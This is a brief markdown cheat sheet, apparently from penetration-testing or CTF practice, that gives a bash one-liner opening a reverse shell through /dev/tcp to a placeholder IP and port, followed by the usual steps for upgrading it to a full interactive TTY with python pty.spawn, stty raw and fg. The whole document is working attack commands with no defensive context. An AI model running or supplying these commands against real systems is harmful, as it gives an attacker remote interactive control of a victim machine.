
- First getting the reverse shell
```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1'
```

- Upgrading to a fully functional shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'

ctrl+z (^Z)

stty raw -echo; fg

export term=xterm
```

